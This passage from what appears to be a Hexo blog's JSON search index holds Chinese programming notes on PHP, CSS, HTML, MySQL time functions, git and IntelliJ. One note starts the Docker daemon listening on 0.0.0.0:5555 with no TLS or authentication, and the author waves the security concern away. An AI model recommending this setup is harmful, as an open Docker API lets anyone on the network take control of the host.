哇哇3C日誌](https://ez3c.tw/1717)\n[Linux 指令歷史紀錄（History）的操作教學與範例 - G. T. Wang](https://blog.gtwang.org/linux/mastering-linux-command-line-history/)\n","tags":["history"],"categories":["Linux"]},{"title":"[PHP] date跳坑記","url":"%2Fblog%2F2018%2F07%2F02%2FPHP-date%E8%B7%B3%E5%9D%91%E8%A8%98%2F","content":"\n\n## [PHP] date跳坑記\n\n今天程式出個bug，竟然提早12小時商品下架\n~~我以為m是分鐘，h是小時~~\ni是分鐘，H是小時(24小時制) h是12小時制\n看了一下程式邏輯好像都沒有問題\n最後找到原因!!!\n<!--more-->\n\n*錯誤code*\n```php\ndate(\"Y-m-d h:m:s\",strtotime(\"+7 days\"));\n```\n\n## 正確寫法\n```php\ndate(\"Y-m-d H:i:s\");\n```\n\nd \t月份中的第几天，有前导零的 2 位数字 \t01 到 31\nD \t星期中的第几天，文本表示，3 个字母 \tMon 到 Sun\nm \t数字表示的月份，有前导零 \t01 到 12\nM \t三个字母缩写表示的月份 \tJan 到 Dec\nn \t数字表示的月份，没有前导零 \t1 到 12\nt \t指定的月份有几天 \t28 到 31\nY \t4 位数字完整表示的年份 \t例如：1999 或 2003\ny \t2 位数字表示的年份 \t例如：99 或 03\na \t小写的上午和下午值 \tam 或 pm\nA \t大写的上午和下午值 \tAM 或 PM\ng \t小时，12 小时格式，没有前导零 \t1 到 12\nG \t小时，24 小时格式，没有前导零 \t0 到 23\nh \t小时，12 小时格式，有前导零 \t01 到 12\nH \t小时，24 小时格式，有前导零 \t00 到 23\ni \t有前导零的分钟数 \t00 到 59>\ns \t秒数，有前导零 \t00 到 59>\n","tags":["date"],"categories":["PHP"]},{"title":"nth-of-type不能用在class selector","url":"%2Fblog%2F2018%2F07%2F02%2Fnth-of-type%E4%B8%8D%E8%83%BD%E7%94%A8%E5%9C%A8class-selector%2F","content":"\n今天踩雷，想用CSS控制class第以個做操控\nnth-of-type 跟nth-child\nnth-of-type是找 第幾個子元素\nnth-child是找位置(位置是指所有元素)\n\n不能抓`.aaa:first-of-type`不能正常跑\n**只能對html元素**\n不能對class\n\n這個雷不要再踩到!!!","tags":["nth-child"],"categories":["CSS"]},{"title":"[HTML]<p>(Phrasing元素)放入div或block元素會分割成兩塊","url":"%2Fblog%2F2018%2F06%2F24%2FHTML-p-Phrasing%E5%85%83%E7%B4%A0-%E6%94%BE%E5%85%A5div%E6%88%96block%E5%85%83%E7%B4%A0%E6%9C%83%E5%88%86%E5%89%B2%E6%88%90%E5%85%A9%E5%A1%8A%2F","content":"\n最近剛好網路爬文看到這個\n\n不過...，我相信不知道這個很容易踩雷\n就先記錄一下\n\n<!--more-->\n\n>Phrasing\n所有可以放在p标签内，构成段落内容的元素均属于Phrasing元素。因此，所有Phrasing元素均属于Flow元素。在HTML5标准文档中，关于Phrasing元素的原始定义为：\n    Phrasing content is the text of the document, as well as elements that mark up that text at the intra-paragraph level. Runs of phrasing content form paragraphs.\n对于这一定义，个人认为不应当使用“text”这一容易引起误解的词，事实上，一个元素即使不是文本，只要能包含在p标签中成为段落内容的一部分，就可以称之为Phrasing元素。比如：audio、video、img、select、input等元素(经测试，这些元素都可以放置在p标签中)。一个不太精确的类比是：HTML5中的Phrasing元素大致就是HTML4中所定义的inline元素。\nPhrasing元素内部一般只能包含别的Phrasing元素。\n\n\n簡單講就是p元素裡面不能隨意插進一些元素\n\n```html\nPhrasing content defines the text and the mark-up it contains. Runs of phrasing content make up paragraphs.\nElements belonging to this category are <abbr>, <audio>, <b>, <bdo>, <br>, <button>, <canvas>, <cite>, <code>, <command>, <data>, <datalist>, <dfn>, <em>, <embed>, <i>, <iframe>, <img>, <input>, <kbd>, <keygen>, <label>, <mark>, <math>, <meter>, <noscript>, <object>, <output>, <progress>, <q>, <ruby>, <samp>, <script>, <select>, <small>, <span>, <strong>, <sub>, <sup>, <svg>, <textarea>, <time>, <var>, <video>, <wbr> and plain text (not only consisting of white spaces characters).\n```\n\n看開發工具，除了排版變怪了，你會看到開發工具有兩個`<p></p>`，最後一個格式還跑掉\n\n{% asset_img show1.png p範例split %}\n\n[HTML Standard](https://html.spec.whatwg.org/multipage/grouping-content.html#the-p-element)\n[W3C HTML5标准阅读笔记 – 元素分类与内容模型(Content Model)](http://blog.shaochuancs.com/w3c-html5-content-model/)","tags":["phrasing"],"categories":["HTML"]},{"title":"[CSS]上層有設min-height也沒用，height:100%竟然無效??","url":"%2Fblog%2F2018%2F06%2F24%2FCSS-%E4%B8%8A%E5%B1%A4%E6%9C%89%E8%A8%ADmin-height%E4%B9%9F%E6%B2%92%E7%94%A8%EF%BC%8Cheight-100-%E7%AB%9F%E7%84%B6%E7%84%A1%E6%95%88%2F","content":"\n父flex\n子height:100%;\n竟然不會延展\n不過flex\n好像不用設定height:100%就會延展(default:stretch)\n\n<!--more-->\n\n同樣div父層設定min-height:100px;\ndiv子層height:100%;\n不會變大，可在子層設定min-height:inherit\n[CSS中height:100%和height:inherit的异同 « 张鑫旭-鑫空间-鑫生活](http://www.zhangxinxu.com/wordpress/2015/02/different-height-100-height-inherit/)\n`在她裡面`，我瞬間背起來單字了\n這個背法還真好背，哈哈\n\n\n### 解法\n不過還是有找到解法，設定父position:relative和子position:absolute，父不用設定height就可以讓子height:100%，是不是很神奇?!!\n\n2018-07-08\n今天做week5 前端修練時光屋發現我有一個高度怪怪的(是用position:absolute) 有加到padding-top:20\n後來查了一下\nleft + margin-left + border-left-width + padding-left + width + padding-right + border-right-width + margin-right + right = 包含块宽度\n\n預設position:static的高度是算 content-box 沒有padding跟margin\n所以可能用absolute跟relative要注意一下他常寬的算法，可能會踩到雷XD\n\n>Your CSS means that the child element's height is 100% of the specified height of the parent element. If you do not specify a height for the parent, then the 100% doesn't mean anything. Hence it doesn't work.\n>What you want can be achieved by using position:relative on the parent and position:absolute on the child:\n>http://jsfiddle.net/57EZn/25/\n>It's not a beautiful solution but it does what you are after.\n\n[html - CSS 100% height of container with min-height - Stack Overflow](https://stackoverflow.com/questions/6995581/css-100-height-of-container-with-min-height)\n\n[关于height：100%无效的解决办法与细节 - CSDN博客](https://blog.csdn.net/SuperCoooooder/article/details/52469520)\n[从height:100%不支持聊聊CSS中的“死循环” « 张鑫旭-鑫空间-鑫生活](http://www.zhangxinxu.com/wordpress/2016/09/talking-about-css-infinite-endless-loop/)\n[CSS中height:100%和height:inherit的异同 « 张鑫旭-鑫空间-鑫生活](http://www.zhangxinxu.com/wordpress/2015/02/different-height-100-height-inherit/)\n\n[JavaScript中的Date对象，以及UTC、GMT、时区的关系 | xtutu](http://xtutu.me/the-date-object-in-js/)\n","tags":["height"],"categories":["CSS"]},{"title":"php可以做陣列比較","url":"%2Fblog%2F2018%2F06%2F24%2Fphp%E5%8F%AF%E4%BB%A5%E5%81%9A%E9%99%A3%E5%88%97%E6%AF%94%E8%BC%83%2F","content":"\n今天無聊試著用array比較\n發現竟然var_dump東西竟然是true\n\n依我印象中Java、JavaScript都不能直接做array比較\n但是php竟然可以....\n太神奇了\n\n\n<!--more-->\n\n```php\n$a = array(array('a','b'));\n$b = array(array('a','b'));\nvar_dump($a == $b );\n```\n\n{% asset_img array_operators.png array_operators %}\n\n\narray也可以用+法，但是+到對印的value還是以左邊為主(本身)\n其實自己測試會比較清楚\n\n>The + operator returns the right-hand array appended to the left-hand array; for keys that exist in both arrays, the elements from the left-hand array will be used, and the matching elements from the right-hand array will be ignored. \n```php\n\n<?php\n$a = array(\"a\" => \"apple\", \"b\" => \"banana\");\n$b = array(\"a\" => \"pear\", \"b\" => \"strawberry\", \"c\" => \"cherry\");\n\n$c = $a + $b; // Union of $a and $b\necho \"Union of \\$a and \\$b: \\n\";\nvar_dump($c);\n\n$c = $b + $a; // Union of $b and $a\necho \"Union of \\$b and \\$a: \\n\";\nvar_dump($c);\n\n$a += $b; // Union of $a += $b is $a and $b\necho \"Union of \\$a += \\$b: \\n\";\nvar_dump($a);\n?>\n\n```\nUnion of $a and $b:\narray(3) {\n  [\"a\"]=>\n  string(5) \"apple\"\n  [\"b\"]=>\n  string(6) \"banana\"\n  [\"c\"]=>\n  string(6) \"cherry\"\n}\nUnion of $b and $a:\narray(3) {\n  [\"a\"]=>\n  string(4) \"pear\"\n  [\"b\"]=>\n  string(10) \"strawberry\"\n  [\"c\"]=>\n  string(6) \"cherry\"\n}\nUnion of $a += $b:\narray(3) {\n  'a' =>\n  string(5) \"apple\"\n  'b' =>\n  string(6) \"banana\"\n  'c' =>\n  string(6) \"cherry\"\n}\n\narray比較 === 跟 ==差別\n在於===會檢查key順序\n```php\n  $a = array (0 => \"apple\", 1 => \"banana\");\n  $b = array (1 => \"banana\", 0 => \"apple\");\n\n  var_dump($a === $b); // prints bool(false) as well\n\n  $b = array (\"0\" => \"apple\", \"1\" => \"banana\");\n\n  var_dump($a === $b); // prints bool(true)\n\n  $b = array (\"0\" => \"apple-1\", \"1\" => \"banana-1\");\n\n  var_dump($a === $b); // prints bool(false)\n```\n\n\n[PHP: Array Operators - Manual](http://www.php.net/manual/en/language.operators.array.php)\n[PHP - Check if two arrays are equal - Stack Overflow](https://stackoverflow.com/questions/5678959/php-check-if-two-arrays-are-equal)\n[PHP 三十天就上手-Day -17 Array Operators - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10053754)","tags":["array"],"categories":["PHP"]},{"title":"outlook自動開啟新信件","url":"%2Fblog%2F2018%2F06%2F24%2Foutlook%E8%87%AA%E5%8B%95%E9%96%8B%E5%95%9F%E6%96%B0%E4%BF%A1%E4%BB%B6%2F","content":"\n現在工作每天都要寫工作進度\n有時候小小一個動作\n可以省很多時間做調整\n\n這個bat是網路找的...\n\n\n<!--more-->\n\n```bat\nREM 取得今天的年、月、日 (自動補零)\nSET TodayYear=%date:~2,2%\nSET TodayMonthP0=%date:~5,2%\nSET TodayDayP0=%date:~8,2%\n\nREM 取得今天的年、月、日 (純數字)\nREM 2010/08/03 更新：以下是為了修正 Batch 遇到 08, 09 會視為八進位的問題\nIF %TodayMonthP0:~0,1% == 0 (\n\tSET /A TodayMonth=%TodayMonthP0:~1,1%+0\n) ELSE (\n\tSET /A TodayMonth=TodayMonthP0+0\n)\n\nIF %TodayMonthP0:~0,1% == 0 (\n\tSET /A TodayDay=%TodayDayP0:~1,1%+0\n) ELSE (\n\tSET /A TodayDay=TodayDayP0+0\n)\n\necho 日期 %TodayYear%/%TodayMonthP0%/%TodayDayP0%\npause\n\"C:\\Program Files (x86)\\Microsoft Office\\Office12\\outlook.exe\" /c ipm.note /m \"mailto:'xxxxx'<ooooooo>;'xxxxx' <oooooo>;&subject=ZeYi-%TodayYear%%TodayMonthP0%%TodayDayP0% 工作回報&body=Dear all:\"\n```\n\n參考來源：\n\n[The Will Will Web | 如何在 Batch 檔取得系統的日期、時間欄位 (第三版)](https://blog.miniasp.com/post/2009/11/03/How-to-get-system-date-time-in-batch-file-part-III.aspx)\n\n\n[How to create an Outlook new email with specified command line?](https://www.extendoffice.com/documents/outlook/5277-outlook-new-email-command-line.html)","tags":["自動化"],"categories":["寫程式一些事"]},{"title":"[PHP]basename採雷記","url":"%2Fblog%2F2018%2F06%2F24%2FPHP-basename%E6%8E%A1%E9%9B%B7%E8%A8%98%2F","content":"\n最近跟同事看smarty，覺得怪怪....\ndisplay(basename('xxxx.php',php));\n\n後來參發現basename第二個參數不會帶.php\n真的 點點點...\n\n不熟這個function，一眼真的會猜錯...\n這種小雷希望不要再採到\n\n\n<!--more-->\n```php\n//顯示帶有文件擴展名的文件名\necho basename($path);\n\n//顯示不帶有文件擴展名的文件名\necho basename($path,\".php\");\n```","tags":["filepath"],"categories":["PHP"]},{"title":"CSS flex常忘記筆記","url":"%2Fblog%2F2018%2F06%2F08%2FCSS-flex%E5%B8%B8%E5%BF%98%E8%A8%98%E7%AD%86%E8%A8%98%2F","content":"\n## flex-direction:  column/column-reverse row row-reverse (預設row)\n\n## flex-wrap: wrap nowrap wrap-reverse (default: nowrap)\n常忘記有**wrap-reverse**\n[Flexbox Froggy - A game for learning CSS flexbox](https://flexboxfroggy.com/)\n最後一關會用到他(我卡很久在那邊)\n\n<!--more-->\n\n## flex-flow: flex-direction flex-wrap;\n\n{% asset_img flex_terms.png flex圖示 %}\nmain axis是主軸線\ncross axis是副軸線\n\n**我覺得上面兩個名詞要搞懂會比較好了解**\n\n## justify-content\n參考flex-direction主軸線\n\n## align-content(default:stretch)  用在多行  單行可能沒做用\n交錯軸上下\n## align-items(default:stretch)，有baseline\n這兩個常常搞錯\n### ※踩雷筆記\n當flex裡面元素沒有設定高度，預設為height:auto的話，**stretch會延展高度100%**\n相反沒有的話，看內文的寬度，ex:`<div></div>`內文沒有高度和文字，但不限顯示出來，除非打字就會有東西\n\nalign-items和align-content公用看起來很像，裡面有詳細介紹\n[flex布局中align-items 和align-content的区别 - CSDN博客](https://blog.csdn.net/sinat_27088253/article/details/51532992)\n[align-content - CSS：层叠样式表 | MDN](https://developer.mozilla.org/zh-CN/docs/Web/CSS/align-content)\n\n\n## width\nflex等於由下面屬性和成\n### flex-grow: (default:0)預設不會延展\n### flex-shrik:(default:1)預設會縮小\n### flex-basis:(default:auto) 依照副軸線對應width或height，長度優先權最高\n[flex-item的flex-basis与width属性有什么关系？ - 额，前端 - SegmentFault 思否](https://segmentfault.com/a/1190000005077709)\n\n### 小雷注意\n如果沒設定`flex-basis`長度的話(有設定width)，flex-shrik不會把元素縮小....\n看來flex-shrik都是依照flex-basis長度縮放為主\n可實作看看會很清楚\n[JS Bin - JS Bin](http://jsbin.com/beqarabozo/edit?html,css,js,output)\n\n>  如果同时设置flex-basis和width，那么width属性会被覆盖，也就是说flex-basis的优先级比width高。有一点需要注意，如果flex-basis和width其中有一个是auto，那么另外一个非auto的属性优先级会更高。\n\n[深入理解css3中的flex-grow、flex-shrink、flex-basis](http://zhoon.github.io/css3/2014/08/23/flex.html)\n有公式\n\n\n## 心得\n\n其實我覺得flex精華都在flex-grow跟flex-shrik上面，其實我之前就有去了解flex\n有玩過Flexbox Froggy遊戲...，但對排版印用不是很了解\nflex-shrik預設竟然是1，會自動縮放，但是flex-grow預設是0\n也就是說在不預設定`flex`屬性時候\n裡面原素預設不會放大，但也不會超過父層寬度\n這用在響印式設計真的還不錯\n\n常常看到很多用`flex:1`，會自動擴大\n我一直以為每個元素都要設定flex，**但其實不用**\n\n**備註**\nflex:1   只會影響flex-grow\n可惡...被padding跟margin影響了XD\n\n\n\n影片教學可參考\n[(1) 卡斯伯 - 20:30 直播 CSS Flex 來試試看 Flex 吧 看看這東西到底是怎麼算的 😆 今天沒有 ZOOM 頻道](https://www.facebook.com/WccCasper/videos/414910278905201/)","tags":["flex"],"categories":["CSS"]},{"title":"[JAVA]IntelliJ IDEA Cannot find declaration to go to","url":"%2Fblog%2F2018%2F06%2F03%2FJAVA-IntelliJ-IDEA-Cannot-find-declaration-to-go-to%2F","content":"\n最近使用IntelliJ IDEA看程式，目前使用裝進去發現沒有自動移置定義功能\nGoogle找一下，發現不能直接開資料夾\n要用import方式開啟檔案\n[IntelliJ IDEA Cannot find declaration to go to - 请叫我头头哥 - 博客园](http://www.cnblogs.com/toutou/p/IntelliJ_Idea_error1.html)\n[Intellij IDEA ，按Ctrl+左键，不能进入类或方法的【解决办法】，提示Cannot find declaration to go to - CSDN博客](https://blog.csdn.net/zy_zhengyang/article/details/78581259)\n","tags":["IntelliJ IDEA"],"categories":["編輯器"]},{"title":"IntelliJ IDEA 關閉自動存檔","url":"%2Fblog%2F2018%2F06%2F03%2FIntelliJ-IDEA-%E9%97%9C%E9%96%89%E8%87%AA%E5%8B%95%E5%AD%98%E6%AA%94%2F","content":"\n最近因為專案要從IntelliJ IDEA看JAVA程式\n原本用Visual Studio Code追code太累了\n最後受不了裝了IntelliJ IDEA\n發現他會自動存檔....\n當然這個要解決\n\n<!--more-->\n\n但在[如何完全禁用 IDEA 的自动保存功能 - V2EX](https://www.v2ex.com/t/375728)\n很多人都不建議關掉\n大多數很多人都說自動存檔是IntelliJ IDEA特色\n要還原那直接用git還原...\n\n不過我那個專案沒有GIT\n所以還是看情況吧\n\n\n參考來源:\n[intellij 关闭自动保存和标志修改文件为星号 - CSDN博客](https://blog.csdn.net/wangjun5159/article/details/55223630)\n[Blog of Bruce: IntelliJ IDEA 設定](http://javabruce.blogspot.com/2017/08/intellij-idea.html)\n\n[Intellij IDEA Java类不保存时自动编译 - 代码日志](https://codeday.me/bug/20170617/27265.html)\n","tags":["IntelliJ"],"categories":["編輯器"]},{"title":"git同步分支衝突解決方法","url":"%2Fblog%2F2018%2F06%2F02%2Fgit%E5%90%8C%E6%AD%A5%E5%88%86%E6%94%AF%E8%A1%9D%E7%AA%81%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95%2F","content":"\n之前副理叫我push上去他加入的gitlab空repo\n我push竟然跑出`fatal: refusing to merge unrelated histories`\n好在Google一下有找到答案\n\n<!--more-->\n\n```sh\ngit pull origin master --allow-unrelated-histories\n```\n\n不過後來有想到一個方法\n就是直接下載那個git clone\n然後copy檔案到那個clone下來就直接commit\n\n但這缺點就不法把之前所有commit帶進去\n看來還是用Google找的方法\n\n參考來源\n* [第 24 天：使用 GitHub 遠端儲存庫 - 入門篇 -- 範例照打無法成功 · Issue #31 · doggy8088/Learn-Git-in-30-days · GitHub](https://github.com/doggy8088/Learn-Git-in-30-days/issues/31)\n* [git push - Git: which is the default configured remote for branch? - Stack Overflow](https://stackoverflow.com/questions/4847101/git-which-is-the-default-configured-remote-for-branch)\n* [解决Git refusing to merge unrelated histories问题 | Doublemine](https://notes.wanghao.work/2017-06-28-%E8%A7%A3%E5%86%B3Git-refusing-to-merge-unrelated-histories%E9%97%AE%E9%A2%98.html)","tags":["git"],"categories":["Git"]},{"title":"MYSQL 時間運算 筆記","url":"%2Fblog%2F2018%2F05%2F31%2FMYSQL-%E6%99%82%E9%96%93%E9%81%8B%E7%AE%97-%E7%AD%86%E8%A8%98%2F","content":"\n平常用到時間運算，假如能在SQL撈到想要的資料\n這樣程式可以寫得少，速度也跟者快...\n但是偏偏MySQL時間運算不太熟\n在此網路找一些，寫筆記....\n\n<!--more-->\n\n[MySQL :: MySQL 5.5 Reference Manual :: 12.7 Date and Time Functions](https://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html)\n\n`UNIX_TIMESTAMP()`可以用between...and做比較\n* [mysql - UNIX_TIMESTAMP() comparison - Stack Overflow](https://stackoverflow.com/questions/20642626/unix-timestamp-comparison)\n\n### UNIX_TIMESTAMP()<==>FROM_UNIXTIME()\n\n`UNIX_TIMESTAMP()`產生UNIX時間戳記\n`FROM_UNIXTIME()`轉一般時間標記(xxxx-xx-xx oo:oo:oo)\n\n### DATEDIFF('2015-09-28 21:00:01','2015-08-31 13:00:01');\n算出差幾天\n帶進去參數不一定要DATETIME格式\nUNIX_TIMESTAMP也可以\n\n### TIMEDIFF('2015-09-28 21:00:01','2015-09-28 13:23:11')\n算出差幾秒，傳回時間格式(datetime)\n[php - MySQL: how to get the difference between two timestamps in seconds - Stack Overflow](https://stackoverflow.com/questions/3528219/mysql-how-to-get-the-difference-between-two-timestamps-in-seconds/3528228#3528228)\n\n**不同於一般DB2和Oracle資料庫用法**\n\n[MySQL Tryit Editor v1.0](https://www.w3schools.com/sql/trymysql.asp?filename=trysql_func_mysql_timediff2)\n可用MySQL函式,day(),month()....來做判斷幾天或幾個月\n\n* [使用MySQL時間函數(function)轉換UNIX時間戳記與時間加減 @ 史丹利愛碎念 :: 痞客邦 ::](http://newaurora.pixnet.net/blog/post/204336313-%E4%BD%BF%E7%94%A8mysql%E6%99%82%E9%96%93%E5%87%BD%E6%95%B8%28function%29%E8%BD%89%E6%8F%9Bunix%E6%99%82%E9%96%93%E6%88%B3%E8%A8%98%E8%88%87)\n\n### TIMESTAMPDIFF(DAY,'2015-09-28 21:00:01','2015-09-28 13:23:11')\n\n[php - mysql timediff to hours - Stack Overflow](https://stackoverflow.com/questions/2174058/mysql-timediff-to-hours)\n\n### to_days<=>from_days\nto_days()傳回天數數字\n+1就是加1天\n\n看範例比較快\n[糯米玩PC: MySql 按日期進行統計](http://sanujpblue.blogspot.tw/2014/12/mysql.html)\n[TO_DAYS日期函数 - 我的地盘 - ITeye博客](http://282120928-qq-com.iteye.com/blog/1289492)\n```\nSELECT from_days(to_days(now())+1);   \n```\n[MySQL Tryit Editor v1.0](https://www.w3schools.com/sql/trymysql.asp?filename=trysql_func_mysql_from_days)\n直接試比較快懂，我爬了很久\n以為是UNIX_TIMESTAMP....**但不是**\n\n### time_to_sec<=>sec_to_time\n\n用時間格式轉乘秒，可以超過24小時\n(感覺能用在UNIX_TIMESTAMP運算上面)\n\n[MySQL TIME_TO_SEC() Function](https://www.w3schools.com/sql/func_mysql_time_to_sec.asp)\n\n\n\n* [MySQL日期時間函數大全 @ 資訊園 :: 痞客邦 ::](http://fecbob.pixnet.net/blog/post/39089591-mysql%E6%97%A5%E6%9C%9F%E6%99%82%E9%96%93%E5%87%BD%E6%95%B8%E5%A4%A7%E5%85%A8)\n* [sql - Compare dates in MySQL - Stack Overflow](https://stackoverflow.com/questions/3651985/compare-dates-in-mysql)\n* [MYSQL时间函数 - 简书](https://www.jianshu.com/p/59dfdb9918cd)\n* [mysql - SELECT row by DATEPART() - Stack Overflow](https://stackoverflow.com/questions/13402012/select-row-by-datepart)\n\n### MySQL跟DB2 差異寫法\n\n回憶以前用db2的時候\n\n[项目中用到过的MYSQ和DB2的部分函数转化 （zxz）_MySQL_第七城市](http://www.th7.cn/db/mysql/201712/260897.shtml)\nhttps://hackmd.io/iQcvSsh_Td6T6oxDjwWXew?view\n備份用...\n[MySQL :: MySQL 5.5 Reference Manual :: 12.7 Date and Time Functions](https://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_quarter)\n\n### UNIX_TIMESTAMP 時間加法運算\n\nselect now() +  INTERVAL 5 HOUR\n\n`now()`跟`CURRENT_TIMESTAMP`是一樣的\n\n很常看到都是用DATETIME型態做運算\n\ndatetime運算其實有`DATE_ADD`和`DATE_SUB`\n> DATE_ADD和DATE_SUB其實可以通用，因為expr可以為一個負數。\n其實很簡單，一個是用加一個是減，不過...DATE_ADD(xxx, - INTERVAL 5 MINUNT) 可以用負數\n\n最後，感覺能用在TIME_TO_SEC用在運算上面\n但不知道網路上很少這樣用\n\n\n\n### 小心效能\n# MySQL裡的NOW()與UNIX_TIMESTAMP()\n\ndate(欄位) = xxx 很吃效能\n盡量用 WHERE `date` >= '2010-10-01' AND `date` < '2010-11-01'\n\n* [date - Difference between UNIX_TIMESTAMP and NOW() in MySQL - Stack Overflow](https://stackoverflow.com/questions/14849911/difference-between-unix-timestamp-and-now-in-mysql)\n* [mysql中日期比较大小的方法 - CSDN博客](https://blog.csdn.net/qq2712193/article/details/48766575)\n* [MySQL compare DATE string with string from DATETIME field - Stack Overflow](https://stackoverflow.com/questions/2758486/mysql-compare-date-string-with-string-from-datetime-field/17169859#17169859)\n* [MYSQL数据库时间字段INT,TIMESTAMP,DATETIME性能效率比较](http://www.piaoyi.org/database/MYSQL-INT-TIMESTAMP-DATETIME.html)\n* [datetime - How to optimize date time search in Mysql? - Stack Overflow](https://stackoverflow.com/questions/4233095/how-to-optimize-date-time-search-in-mysql)\n* [MySQL中的UNIX_TIMESTAMP函数使用总结 - 曾是土木人 - 博客园](http://www.cnblogs.com/hongfei/archive/2012/06/08/2541599.html)\n\n\n\nwhere DATE(`time_stamp`) = DATE(now());\n\n用在欄位很吃效能，可能會造成full scan\ndatetime要怎麼比較今天呢??\n這個我相信很常用\n有找到這個\n`WHERE startTime >= '2010-04-29' AND startTime < ('2010-04-29' + INTERVAL 1 DAY)`\n[MySQL compare DATE string with string from DATETIME field - Stack Overflow](https://stackoverflow.com/questions/2758486/mysql-compare-date-string-with-string-from-datetime-field/17169859#17169859)\n可以參考上面第二個解答\n對非欄位做轉換比較不會吃資源\n雖然不知道為什麼最佳解答是第一個吃效能的\n呵呵\n\n\n相信可能還有更好用的\n可能我沒有記錄到\n不過我相信我應該會很常回來看這篇\n\n\n參考來源:\n* [mysql - selecting rows in the last 5 minutes using unix time stamp - Stack Overflow](https://stackoverflow.com/questions/13064516/selecting-rows-in-the-last-5-minutes-using-unix-time-stamp)\n* [MySQL :: MySQL 8.0 Reference Manual :: 12.7 Date and Time Functions](https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_addtime)\n* [sql - Difference between now() and current_timestamp - Database Administrators Stack Exchange](https://dba.stackexchange.com/questions/63548/difference-between-now-and-current-timestamp)\n* [database - Difference between SYSDATE(),NOW(),CURRENT_TIMESTAMP,CURRENT_TIMESTAMP() in MySQL? - Stack Overflow](https://stackoverflow.com/questions/28315254/difference-between-sysdate-now-current-timestamp-current-timestamp-in-mysq)\n* [MySQL系统时间函数NOW(),CURRENT_TIMESTAMP(),SYSDATE()的区别 - Qiurf - 博客园](http://www.cnblogs.com/drcoding/p/4624851.html)","tags":["to_days"],"categories":["MySQL"]},{"title":"PHP_xlsx_writer  excel 15位數會進動進位的問題","url":"%2Fblog%2F2018%2F05%2F31%2FPHP-xlsx-writer-excel-15%E4%BD%8D%E6%95%B8%E6%9C%83%E9%80%B2%E5%8B%95%E9%80%B2%E4%BD%8D%E7%9A%84%E5%95%8F%E9%A1%8C%2F","content":"\n最近公司用xlsx_writer做報表[mk-j/PHP_XLSXWriter: Lightwight XLSX Excel Spreadsheet Writer in PHP](https://github.com/mk-j/PHP_XLSXWriter)\n發現使用者編號(uid)竟然跟DB不一樣....\n讓我震驚了!!!以為我程式出BUG了...\n\n<!--more-->\n\n原本以為是我程式哪裡出問題，結果發現var_dump正常\n打開Excel就不正常了\n\n\n15位數Excel會自動補0\n[如何解決EXCEL數字過長自動加0的問題？ @ 阿水資訊站 :: 痞客邦 ::](http://waterisme.pixnet.net/blog/post/33761621-%E5%A6%82%E4%BD%95%E8%A7%A3%E6%B1%BAexcel%E6%95%B8%E5%AD%97%E9%81%8E%E9%95%B7%E8%87%AA%E5%8B%95%E5%8A%A00%E7%9A%84%E5%95%8F%E9%A1%8C%EF%BC%9F)\n\n沒想到採到這個雷.....\n\n明明有對header做string\n但超過15位數就不正常\n其他有設定string(沒超過15位數)都顯示正常\n\n\n不過最後神同事用`=\"123456789123456789123456789\"`\n解決問題!!\n\n\n","tags":["xlsx"],"categories":["PHP"]},{"title":"使用phpstorm用docker remote遠端操作","url":"%2Fblog%2F2018%2F05%2F26%2F%E4%BD%BF%E7%94%A8phpstorm%E7%94%A8docker-remote%E9%81%A0%E7%AB%AF%E6%93%8D%E4%BD%9C%2F","content":"\n最近在測試phpstorm\n因為不想在window 10上灌docker\n想遠端連docker\n發現phpstorm好像有遠端控制選項\n\n{% asset_img phpstorm_docker.png phpstorm設定docker選項 %}\n\n<!--more-->\n\n在使用內建遠端時候\n起注意這個會有安全性的問題\n至於我在家裡使用\n不需要考慮到這一塊\n暫時不考慮TSL那一塊\n\n之前有買「Docker入門與實戰」\n但是書上docker daemon用不出來\n\n後來看了網路用法不太一樣\n[远程连接docker daemon，Docker Remote API | Deepzz's Blog](https://deepzz.com/post/dockerd-and-docker-remote-api.html)\n\nhttps://docs.docker.com/engine/reference/commandline/dockerd/#description\n```sh\nsudo <path to>/dockerd -H 0.0.0.0:5555 &\n```\n打上這樣久能開啟5555 port給phpstorm操作使用\n不過在第一次開啟感覺還是打指令比較方便耶...\n\n\n當然也可以照[远程连接docker daemon，Docker Remote API | Deepzz's Blog](https://deepzz.com/post/dockerd-and-docker-remote-api.html)\n設定/etc/docker/daemon.json在執行`dockerd`\n\n這樣就能愉悅在phpstorm玩docker\n\n","tags":["phpstorm"],"categories":["docker"]},{"title":"MySQL抓資料設定字串欄位為索引查詢優化方法","url":"%2Fblog%2F2018%2F05%2F26%2FMySQL%E6%8A%93%E8%B3%87%E6%96%99%E8%A8%AD%E5%AE%9A%E5%AD%97%E4%B8%B2%E6%AC%84%E4%BD%8D%E7%82%BA%E7%B4%A2%E5%BC%95%E6%9F%A5%E8%A9%A2%E5%84%AA%E5%8C%96%E6%96%B9%E6%B3%95%2F","content":"\n常把搜尋條件用在索引上面\n可以加快查詢\n今天實驗一個東西，把uid加入到index上面\n但是`explain`竟然還是full scan\nindex還會有掃全表的問題\n覺得很神奇\n就稍微研究一下\n筆記筆記\n\n<!--more-->\n\n{% asset_img slow.png 一般查詢 %}\n\n沒有用`*`查詢，竟然還會full scan\nGoogle查詢一下，varchar做為index好像不太好(不確定是這個問題，相關資訊太少)\n\n就換了一下查法\n\n{% asset_img fast.png \"primary key,index key查詢\" %}\n\n竟然就正常...\n\n那試試*看看好了...\n{% asset_img normal.png \"primary key,index key查詢\" %}\nfull scan\n\n最後試試，IN優化方法(使用inner join )\n\n{% asset_img best.png \"primary key,index key查詢\" %}\n\n**注意where用哪張表，select就要用另一張表**\n\n這樣就不會full scan了\n愉悅!!!!\n\n參考來源：\n* [对mysql中last_insert_id()的新理解-博客即日起停止更新-51CTO博客](http://blog.51cto.com/sucre/723808)\n* [[数据库与SQL] - No.5 MYSQL实现 RANK函数排序功能 - CSDN博客](https://blog.csdn.net/tjuyanming/article/details/77825875)\n* [Mysql row number()排序函数的用法和注意_Mysql_脚本之家](http://www.jb51.net/article/87777.htm)\n* [MySQL rownum的實作與排名的方法 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/articles/10136053)\n* [mysql的最佳索引攻略 · Mysql设计与优化专题 · 看云](https://www.kancloud.cn/thinkphp/mysql-design-optimalize/39319)\n* [MySQL慢查询Explain Plan分析 - 